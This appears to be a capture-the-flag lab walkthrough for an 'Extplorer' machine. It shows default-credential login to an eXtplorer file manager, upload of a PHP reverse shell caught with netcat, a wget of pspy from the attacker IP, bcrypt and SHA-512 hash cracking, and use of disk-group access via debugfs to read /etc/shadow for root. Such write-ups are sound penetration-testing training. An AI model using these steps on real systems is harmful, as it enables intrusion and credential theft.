@@ -1,0 +1,164 @@
+																							               Extplorer Walkthrough
+																										
+Attacker's Machine: 192.168.45.181
+Victim's Machine: 192.168.198.16
+export IP=192.168.198.16
+	
+nmapAutomator.sh -H $IP -t Full
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
+|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
+|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# Going over the web app, it seems that it is misconfigured, cant' really do anything to it, so most likely, we need to go after enumeration, maybe we get a good hit.
+
+gobuster dir -u http://$IP:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -b 404 -x html,txt,bak,pdf,config,php,zip
+
+# Nothing found using various extension, let's go after directories and shit
+
+gobuster dir -u http://$IP:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -b 404
+
+/wp-content           (Status: 301) [Size: 321] [--> http://192.168.198.16/wp-content/]
+/wordpress            (Status: 301) [Size: 320] [--> http://192.168.198.16/wordpress/]
+/wp-includes          (Status: 301) [Size: 322] [--> http://192.168.198.16/wp-includes/]
+/wp-admin             (Status: 301) [Size: 319] [--> http://192.168.198.16/wp-admin/]
+/filemanager          (Status: 301) [Size: 322] [--> http://192.168.198.16/filemanager/]
+
+# Interesting, accessing filemanager, we found another login page 
+
+
+
+# We found some exploits for Extplorer using searchsploit, but we need a version first
+
+searchsploit extplorer
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                             |  Path
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+eXtplorer 2.1 - Arbitrary File Upload (Metasploit)                                                                                         | php/remote/24018.rb
+eXtplorer 2.1.9 - '.ZIP' Directory Traversal                                                                                               | php/webapps/39816.php
+eXtplorer<= 2.1.14 - Authentication Bypass & Remote Code Execution (RCE)                                                                   | php/webapps/51067.txt
+
+# can't find shit, let's check online for some common credentails
+
+eXtplorer - default credentials
+
+
+https://github.com/soerennb/extplorer
+
+# Reading though the repository, we see that this is a file manager and uses as default credentails admin / admin
+
+   
+
+# Nice, we got in, now let's see what we can do about it
+   Went over specific configuration files within wordpress, didn't find anything out of the ordinary. Since Wordpress is running php files, maybe we should create a php file within extplorer and try to access through our browser and hopefully it will be executed and grant us a shell.
+   
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 
+
+
+
+# Use the php reverse shell from pentest monkey as the content of urs and try to access the file from the wordpress endpoint while having a listener opened.
+
+http://192.168.198.16/wp-admin/urs.php
+
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.181] from (UNKNOWN) [192.168.198.16] 33148
+Linux dora 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+ 11:46:24 up 29 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+
+# we can see that we have one user on the machine, dora. Let's see how we can get access to it and read the contents of the local.txt file.
+   Let's run linpeas
+   
+Hostname: dora
+Writable folder: /dev/shm
+
+wget http://192.168.45.181:80/pspy64
+
+# Nothing really usefull, i guess we have go manually over different configuration files
+   In the end we found the fucking configuration file that contains the hash of user dora and admin
+
+
+
+
+
+$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS
+
+# Let's try to crack the hash
+
+
+
+Maybe?
+
+john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+doraemon         (?)     
+
+# So, let's try to log in with the user dora / dotaemon
+
+su dora
+Password: doraemon
+
+whoami
+dora
+
+# Good, we have access to dora account, let's grab the flag and go after privesc.
+
+cd /home/dora
+cat local.txt
+0e7cfa88e3965001fd11a153ac2c6579
+
+# privesc!
+
+id
+uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
+
+# Display the available partitions. The disk group gives the user full access to any block devices contained within /dev/. 
+   Since /dev/ will in general be the global file-system, and the disk group will have full read-write privileges to this device
+    
+
+df -h
+/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.3G  55% /
+udev                               947M     0  947M   0% /dev
+tmpfs                              992M     0  992M   0% /dev/shm
+tmpfs                              199M  1.2M  198M   1% /run
+tmpfs                              5.0M     0  5.0M   0% /run/lock
+tmpfs                              992M     0  992M   0% /sys/fs/cgroup
+/dev/sda2                          1.7G  209M  1.4G  13% /boot
+/dev/loop1                          64M   64M     0 100% /snap/core20/1852
+/dev/loop2                          92M   92M     0 100% /snap/lxd/24061
+/dev/loop0                          62M   62M     0 100% /snap/core20/1611
+/dev/loop3                          50M   50M     0 100% /snap/snapd/18596
+/dev/loop4                          68M   68M     0 100% /snap/lxd/22753
+tmpfs                              199M     0  199M   0% /run/user/1000
+
+#  Knowing your user is part of the disk group we can use debugfs to enumerate the entire disk with effectively root level privileges. We also have full read-write access to the disk block files, so we can extricate these or write arbitrary data to them. With the disk group, we are effectively root. We will explore the partition where the / (root) directory is mounted on in this case /dev/mapper/ubuntu--vg-ubuntu--lv
+
+debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+debugfs 1.45.5 (07-Jan-2020)
+debugfs:  cat /etc/shadow
+cat /etc/shadow
+root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::
+daemon:*:19235:0:99999:7:::
+
+# Let's try to crack the SHA512 hash
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+
+explorer         (root)  
+
+su root
+explorer
+
+cd /root
+cat proof.txt
+ab0f4341c79092b65db346812a702496
